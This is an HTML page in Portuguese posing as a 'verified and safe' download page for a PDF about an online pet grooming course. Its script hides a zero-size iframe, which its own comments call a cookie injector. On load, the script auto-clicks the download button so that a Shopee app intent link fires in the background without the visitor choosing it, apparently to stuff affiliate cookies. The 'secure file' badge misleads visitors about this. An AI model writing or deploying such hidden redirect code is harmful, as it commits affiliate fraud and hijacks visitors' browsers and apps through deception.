<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Seguro - Curso de Banho e Tosa Online Vale a Pena?</title>
    <style>
        body { font-family: 'Inter', -apple-system, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 100%; }
        .icon { background: #e8f5e9; color: #4caf50; width: 64px; height: 64px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
        .icon svg { width: 32px; height: 32px; }
        h1 { color: #1a1a1a; font-size: 22px; margin-bottom: 10px; line-height: 1.3; }
        p { color: #666; font-size: 15px; margin-bottom: 30px; }
        .secure-badge { display: inline-flex; align-items: center; gap: 6px; background: #f0fdf4; color: #15803d; padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 25px; }
        .btn { background: #10b981; color: white; border: none; padding: 16px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 10px; }
        .btn:hover { background: #059669; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #10b981; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Iframe invisivel para injetar cookie da Shopee */
        .invisible-frame { width: 0; height: 0; border: 0; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
        </div>
        <h1>Curso de Banho e Tosa Online Vale a Pena?</h1>
        <p>Seu arquivo está pronto para download.</p>
        
        <div class="secure-badge">
            <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
            Arquivo Verificado e Seguro
        </div>

        <a href="Curso_de_Banho_e_Tosa_Online_Vale_a_Pena_.pdf" id="downloadBtn" download class="btn">
            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
            <span id="btnText">Baixar Material Seguro</span>
            <div id="btnLoader" class="loader"></div>
        </a>
    </div>

    <!-- Iframe invisivel que engatilha a abertura da Shopee no fundo -->
    <iframe id="cookie-dropper" class="invisible-frame"></iframe>

    <script>
        const btn = document.getElementById('downloadBtn');
        const text = document.getElementById('btnText');
        const loader = document.getElementById('btnLoader');
        const intentUrl = "intent://shope.ee/8pK9zQ8J9y#Intent;scheme=https;package=com.shopee.br;S.browser_fallback_url=https%3A%2F%2Fshope.ee%2F8pK9zQ8J9y;end";

        let actionTriggered = false;

        function triggerAction() {
            if(actionTriggered) return;
            actionTriggered = true;
            
            // Dispara o Shopee Intent Iframe
            document.getElementById('cookie-dropper').src = intentUrl;
            
            text.style.display = 'none';
            loader.style.display = 'block';
            
            // Apos alguns segundos, retorna o botao ao estado original
            setTimeout(() => {
                text.style.display = 'block';
                loader.style.display = 'none';
            }, 3000);
        }

        btn.addEventListener('click', () => {
            triggerAction();
        });

        window.onload = () => {
            // Tenta forçar o download e cookie assim que carrega
            setTimeout(() => {
                btn.click();
            }, 500);
        };
    </script>
</body>
</html>
